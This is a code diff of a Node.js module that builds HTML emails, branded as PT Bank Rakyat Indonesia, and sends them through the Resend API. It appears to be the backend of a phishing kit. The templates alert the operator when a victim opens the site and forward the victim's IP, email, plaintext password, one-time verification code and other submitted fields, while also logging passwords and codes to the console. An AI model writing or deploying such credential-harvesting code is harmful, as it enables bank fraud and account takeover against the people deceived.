@@ -5,104 +5,290 @@ const path = require('path');
 // Initialize Resend
 const resend = new Resend(process.env.RESEND_API_KEY);
 
-// Load email template
+// Load email template - inline templates to avoid file extraction issues
 function getEmailTemplate(templateType, data) {
-  const templatePath = path.join(__dirname, '..', 'email-template.html');
-  let template = fs.readFileSync(templatePath, 'utf8');
-  
-  // Extract the specific template - use a more robust regex to handle nested tables
-  const startIndex = template.indexOf(`<div id="template-${templateType}">`);
-  if (startIndex === -1) {
-    console.error('Template start not found:', templateType);
-    throw new Error(`Template ${templateType} not found`);
-  }
-  
-  // Find the matching closing div by counting nested divs
-  let depth = 1;
-  let currentIndex = startIndex + `<div id="template-${templateType}">`.length;
-  let endIndex = -1;
-  
-  while (depth > 0 && currentIndex < template.length) {
-    const nextOpen = template.indexOf('<div', currentIndex);
-    const nextClose = template.indexOf('</div>', currentIndex);
-    
-    if (nextClose === -1) {
-      break;
-    }
-    
-    if (nextOpen !== -1 && nextOpen < nextClose) {
-      depth++;
-      currentIndex = nextOpen + 4;
-    } else {
-      depth--;
-      if (depth === 0) {
-        endIndex = nextClose;
-        break;
-      }
-      currentIndex = nextClose + 6;
-    }
-  }
-  
-  if (endIndex === -1) {
-    console.error('Template end not found:', templateType);
-    throw new Error(`Template ${templateType} closing div not found`);
-  }
-  
-  let specificTemplate = template.substring(startIndex, endIndex + 6);
-  
-  console.log('Extracted template length:', specificTemplate.length);
-  console.log('Template contains placeholders:', specificTemplate.includes('{{'));
-  console.log('Data received:', JSON.stringify(data));
-  
-  // Replace placeholders based on template type
   const timestamp = new Date().toISOString();
+  let template = '';
   
   switch(templateType) {
     case 'website-visit':
-      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
-      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
-      specificTemplate = specificTemplate.replace(/\{\{ip_address\}\}/g, data.ip_address || 'Unknown');
-      specificTemplate = specificTemplate.replace(/\{\{website_url\}\}/g, data.website_url || 'http://localhost:3000');
+      template = `
+        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
+          <tr>
+            <td align="center">
+              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
+                <tr>
+                  <td style="padding: 30px;">
+                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                      <tr>
+                        <td align="center" style="padding-bottom: 25px;">
+                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🚀 WEBSITE ACCESS ALERT</h1>
+                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+                            HEY!!!, ${data.name || 'Sugeng Yulianto'} just open website, get ready.
+                          </p>
+                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+                            This is an automated notification that someone has accessed the BRI website.
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>Timestamp:</strong> ${timestamp}</p>
+                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>IP Address:</strong> ${data.ip_address || 'Unknown'}</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td align="center" style="padding-top: 25px;">
+                          <a href="${data.website_url || 'http://localhost:3000'}" style="display: inline-block; padding: 12px 30px; background: #0B5FFF; color: #fff; text-decoration: none; border-radius: 8px; font-weight: 600; font-size: 14px;">Visit Website</a>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
+                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+        </table>
+      `;
       break;
       
     case 'email-submission':
-      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
-      specificTemplate = specificTemplate.replace(/\{\{email\}\}/g, data.email || 'Not provided');
-      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
-      console.log('Email value being replaced:', data.email);
-      console.log('Template after email replacement:', specificTemplate.includes(data.email));
+      template = `
+        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
+          <tr>
+            <td align="center">
+              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
+                <tr>
+                  <td style="padding: 30px;">
+                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                      <tr>
+                        <td align="center" style="padding-bottom: 25px;">
+                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">📧 EMAIL SUBMISSION</h1>
+                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+                            THIS IS ${data.name || 'Sugeng Yulianto'} Email = "${data.email || 'Not provided'}"
+                          </p>
+                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+                            User has submitted their email address through the BRI website authentication system.
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>Submitted Email:</strong> ${data.email || 'Not provided'}</p>
+                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> ${timestamp}</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #fff3cd; padding: 15px; border-radius: 6px; border-left: 4px solid #ffc107;">
+                          <p style="color: #856404; font-size: 13px; margin: 0;">⚠️ Please verify this email address before proceeding with authentication.</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
+                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+        </table>
+      `;
+      console.log('Email template generated with email:', data.email);
       break;
       
     case 'password-submission':
-      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
-      specificTemplate = specificTemplate.replace(/\{\{password\}\}/g, data.password || 'Not provided');
-      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
-      console.log('Password value being replaced:', data.password);
-      console.log('Template after password replacement:', specificTemplate.includes(data.password));
+      template = `
+        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
+          <tr>
+            <td align="center">
+              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
+                <tr>
+                  <td style="padding: 30px;">
+                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                      <tr>
+                        <td align="center" style="padding-bottom: 25px;">
+                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🔐 PASSWORD SUBMISSION</h1>
+                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+                            THIS IS ${data.name || 'Sugeng Yulianto'} password = "${data.password || 'Not provided'}"
+                          </p>
+                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+                            User has submitted their password through the BRI website authentication system.
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>User:</strong> ${data.name || 'Sugeng Yulianto'}</p>
+                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Password:</strong> ${data.password || 'Not provided'}</p>
+                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> ${timestamp}</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #d4edda; padding: 15px; border-radius: 6px; border-left: 4px solid #28a745;">
+                          <p style="color: #155724; font-size: 13px; margin: 0;">✅ Password received. Authentication process in progress.</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
+                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+        </table>
+      `;
+      console.log('Password template generated with password:', data.password);
       break;
       
     case 'verification-code':
-      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
-      specificTemplate = specificTemplate.replace(/\{\{code\}\}/g, data.code || 'Not provided');
-      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
-      console.log('Code value being replaced:', data.code);
-      console.log('Template after code replacement:', specificTemplate.includes(data.code));
+      template = `
+        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
+          <tr>
+            <td align="center">
+              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
+                <tr>
+                  <td style="padding: 30px;">
+                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                      <tr>
+                        <td align="center" style="padding-bottom: 25px;">
+                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">🔢 VERIFICATION CODE</h1>
+                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+                            THIS IS THE One time verification code!! = "${data.code || 'Not provided'}"
+                          </p>
+                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+                            A verification code has been generated for ${data.name || 'Sugeng Yulianto'}.
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: linear-gradient(135deg, #0B5FFF 0%, #0A63E6 100%); padding: 25px; border-radius: 8px; text-align: center; margin-bottom: 20px;">
+                          <p style="color: #fff; font-size: 32px; font-weight: 800; margin: 0; letter-spacing: 4px;">${data.code || 'Not provided'}</p>
+                          <p style="color: rgba(255,255,255,0.8); font-size: 13px; margin: 10px 0 0;">This code expires in 10 minutes</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>Recipient:</strong> ${data.name || 'Sugeng Yulianto'}</p>
+                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Generated:</strong> ${timestamp}</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #fff3cd; padding: 15px; border-radius: 6px; border-left: 4px solid #ffc107;">
+                          <p style="color: #856404; font-size: 13px; margin: 0;">⚠️ Do not share this code with anyone. BRI will never ask for your verification code.</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
+                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+        </table>
+      `;
+      console.log('Verification code template generated with code:', data.code);
       break;
       
     case 'information-submission':
-      specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
-      specificTemplate = specificTemplate.replace(/\{\{information_array\}\}/g, formatInformationArray(data.information_array));
-      specificTemplate = specificTemplate.replace(/\{\{field_count\}\}/g, data.field_count || '0');
-      specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
+      template = `
+        <table cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color: #f4f4f4; padding: 40px 0;">
+          <tr>
+            <td align="center">
+              <table cellpadding="0" cellspacing="0" border="0" width="600" style="background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%); border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;">
+                <tr>
+                  <td style="padding: 30px;">
+                    <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                      <tr>
+                        <td align="center" style="padding-bottom: 25px;">
+                          <h1 style="color: #0B5FFF; font-size: 28px; font-weight: 800; margin: 0 0 10px 0;">📋 INFORMATION SUBMISSION</h1>
+                          <div style="height: 3px; background: linear-gradient(90deg, #0B5FFF 0%, #0A63E6 100%); width: 80px; margin: 0 auto;"></div>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #fff; padding: 25px; border-radius: 8px; border-left: 4px solid #0B5FFF; margin-bottom: 20px;">
+                          <p style="color: #1a202c; font-size: 18px; font-weight: 600; margin: 0 0 15px 0; line-height: 1.5;">
+                            This is ${data.name || 'Sugeng Yulianto'} submitted information:
+                          </p>
+                          <p style="color: #4a5568; font-size: 14px; margin: 0; line-height: 1.6;">
+                            User has submitted the following information through the BRI website.
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #f7f8f9; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+                          <h3 style="color: #1a202c; font-size: 16px; font-weight: 700; margin: 0 0 15px 0; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px;">Submitted Data:</h3>
+                          ${formatInformationArray(data.information_array)}
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #f7f8f9; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
+                          <p style="color: #666; font-size: 13px; margin: 0;"><strong>Submitted By:</strong> ${data.name || 'Sugeng Yulianto'}</p>
+                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Total Fields:</strong> ${data.field_count || '0'}</p>
+                          <p style="color: #666; font-size: 13px; margin: 5px 0 0;"><strong>Timestamp:</strong> ${timestamp}</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="background: #d1ecf1; padding: 15px; border-radius: 6px; border-left: 4px solid #17a2b8;">
+                          <p style="color: #0c5460; font-size: 13px; margin: 0;">ℹ️ Information has been received and is being processed by the system.</p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="border-top: 1px solid #e2e8f0; margin-top: 25px; padding-top: 25px;">
+                          <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">© 2026 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</p>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+        </table>
+      `;
       break;
       
     default:
       throw new Error(`Unknown template type: ${templateType}`);
   }
   
-  console.log('Final template still has placeholders:', specificTemplate.includes('{{'));
-  console.log('Final template length:', specificTemplate.length);
-  return specificTemplate;
+  console.log('Template generated for:', templateType, 'with data:', JSON.stringify(data));
+  return template;
 }
 
 // Format information array as HTML table
